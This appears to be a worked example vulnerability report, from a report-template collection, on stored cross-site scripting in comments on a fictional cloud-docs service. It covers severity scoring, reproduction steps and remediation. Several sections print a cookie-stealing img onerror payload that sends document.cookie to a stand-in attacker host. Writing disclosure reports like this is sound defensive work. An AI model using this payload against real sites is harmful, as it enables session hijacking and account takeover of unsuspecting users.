# Example Report: Stored XSS in Shared Document Comments — Northwind Cloud Docs

> This is a fully worked, illustrative example using a fictional company ("Northwind Cloud Docs") and fictional program. It demonstrates the expected level of detail when using `report-templates/xss.md`. Do not reuse the fictional URLs, tokens, or company name as if they were real.

## 1. Executive Summary

Northwind Cloud Docs' document-sharing feature allows a document owner to leave comments visible to every collaborator with access to the document. The comment field renders limited Markdown but does not sanitize the resulting HTML output before display, allowing an attacker with comment access to any shared document to execute arbitrary JavaScript in the browser session of every other collaborator who views that document, including workspace administrators. This can be used to steal session tokens and pivot to full workspace administrative access.

## 2. Severity

| Field | Value |
|---|---|
| Overall Severity | High |
| CVSS v3.1 Vector | `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` |
| CVSS v3.1 Score | 8.0 |
| Vulnerability Type | Stored Cross-Site Scripting |

### CVSS Justification

| Metric | Value | Reasoning |
|---|---|---|
| Attack Vector | Network | Delivered via standard HTTPS request to the comment API |
| Attack Complexity | Low | No race condition, no unusual preconditions beyond document access |
| Privileges Required | Low | Attacker needs at least comment-level access to one shared document |
| User Interaction | Required | A victim must open the document containing the malicious comment |
| Scope | Changed | Impact extends beyond the document itself to workspace administrative session compromise |
| Confidentiality | High | Session token theft enables full account impersonation |
| Integrity | High | Attacker can perform any action the victim's session permits |
| Availability | None | No denial-of-service component identified |

## 3. CWE Classification

- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

## 4. OWASP Mapping

- OWASP Top 10 2021: A03:2021 – Injection

## 5. Affected Component

| Field | Value |
|---|---|
| URL | `https://app.northwind-docs.example/api/documents/{doc_id}/comments` |
| Parameter | `body` (Markdown comment content) |
| HTTP Method | POST |
| Authentication Required | Yes — any account with comment access to the target document |
| Rendering Context | HTML body, via server-side Markdown-to-HTML conversion |

## 6. Description

Northwind Cloud Docs converts comment `body` content from Markdown to HTML server-side using a Markdown rendering library, then serves the resulting HTML directly to the client without a subsequent sanitization pass. Standard Markdown syntax (`**bold**`, `[link](url)`) is converted as expected, but the renderer also passes raw inline HTML through unmodified — a common Markdown renderer behavior when "raw HTML passthrough" is left enabled, intended to support advanced formatting but not accounting for untrusted multi-tenant input. As a result, an attacker can embed a raw `<img>` tag with an `onerror` handler directly in a comment, which the renderer passes through unchanged.

## 7. Preconditions

- Attacker requires an account with at least comment-level access to a shared document. This is satisfiable by creating a new document and sharing it with a target, or by being invited as a collaborator to an existing shared document.
- Victim must open the affected document while authenticated.

## 8. Attack Scenario

1. Attacker creates a new document and invites a target organization's workspace administrator as a collaborator, framed as a routine business document (e.g., "Q3 Vendor Proposal").
2. Attacker adds a comment containing a payload that exfiltrates the viewer's session cookie to an attacker-controlled endpoint.
3. The workspace administrator opens the shared document to review it, as prompted by the sharing notification.
4. The payload executes in the administrator's browser session, exfiltrating their session cookie.
5. Attacker replays the stolen session cookie to access the workspace administration panel, gaining the ability to manage all users and documents within the workspace.

## 9. Reproduction Steps

1. Log in as Test Account A. Create a new document titled "Test Doc."
2. Share the document with Test Account B (simulating a target user), granting comment access.
3. As Test Account A, add a comment to the document with the following body:
   ```
   Great work on this draft! <img src=x onerror="fetch('https://attacker-controlled.example/c?c='+document.cookie)">
   ```
4. Log in as Test Account B and open "Test Doc."
5. Confirm the outbound request to `attacker-controlled.example` is received (observed via a controlled listener), containing Test Account B's session cookie value.

## 10. Proof-of-Concept Payload

```html
Great work on this draft! <img src=x onerror="fetch('https://attacker-controlled.example/c?c='+document.cookie)">
```

## 11. HTTP Request

```http
POST /api/documents/doc_88213/comments HTTP/1.1
Host: app.northwind-docs.example
Cookie: session=<Test-Account-A-session>
Content-Type: application/json
Content-Length: 143

{
  "body": "Great work on this draft! <img src=x onerror=\"fetch('https://attacker-controlled.example/c?c='+document.cookie)\">"
}
```

## 12. HTTP Response

```http
HTTP/1.1 201 Created
Content-Type: application/json
Content-Length: 58

{
  "comment_id": "cmt_44210",
  "status": "posted"
}
```

Rendered page HTML observed when Test Account B loads the document:

```http
GET /documents/doc_88213 HTTP/1.1
Host: app.northwind-docs.example
Cookie: session=<Test-Account-B-session>

HTTP/1.1 200 OK
Content-Type: text/html
...
<div class="comment-body"><p>Great work on this draft! <img src="x" onerror="fetch('https://attacker-controlled.example/c?c='+document.cookie)"></p></div>
...
```

## 13. Evidence

- [x] Screenshot of the comment stored and displayed with the raw payload visible in the DOM (via browser DevTools inspection)
- [x] Listener log confirming an inbound request from Test Account B's browser containing the session cookie value, timestamped within 2 seconds of Test Account B opening the document
- [x] Screen recording showing the full chain: comment posted as Account A, document opened as Account B, cookie exfiltrated, session replayed to confirm impersonation

## 14. Impact

- **Confidentiality**: Full session token theft against any user who views a malicious comment, including workspace administrators.
- **Integrity**: An attacker holding a stolen administrator session can perform any administrative action — modify workspace membership, access any document, change billing/account settings.
- **Availability**: Not directly affected.
- **Business Impact**: Given that document sharing is a core, high-frequency workflow, and administrators routinely review shared documents, this represents a realistic and low-effort path to full workspace compromise, not a theoretical edge case.

## 15. Risk Assessment

| Factor | Assessment |
|---|---|
| Likelihood | High — any account holder can trigger this against any user they can share a document with |
| Exploitability | High — reliable, no timing dependency, no filter bypass required |
| Detectability by Defender | Low — no anomalous request pattern, payload is a single normal-looking comment POST |
| Blast Radius | Any user, including administrators, who views a document containing a malicious comment |

## 16. Remediation

### Short-Term
- Disable raw HTML passthrough in the Markdown renderer's configuration immediately; this is typically a single configuration flag and requires no application logic changes.

### Long-Term
- Run all rendered comment HTML through an allow-list HTML sanitizer (e.g., a well-maintained sanitization library configured to permit only the specific tags Markdown rendering is expected to produce: `p`, `strong`, `em`, `a`, `code`, `pre`, `ul`, `ol`, `li`) before storage or, at minimum, before render.
- Apply a strict Content-Security-Policy to the document-viewing page as defense-in-depth, disallowing inline event handlers entirely.
- Add automated regression tests that assert known XSS payload patterns are neutralized by the comment rendering pipeline, run in CI against every change to the Markdown rendering configuration.

## 17. References

- OWASP Cross Site Scripting Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- CommonMark specification (raw HTML handling): https://spec.commonmark.org/

## 18. Report Notes

| Field | Value |
|---|---|
| Reported By | example-researcher |
| Date Reported | 2026-05-14 |
| Program / Client | Northwind Cloud Docs VDP (fictional) |
| Report ID | NW-VDP-2026-0192 (fictional) |
| Tested On | Chrome 126, Firefox 127 |
| Retest Status | Confirmed Fixed — raw HTML passthrough disabled and sanitizer added within 6 days of report |
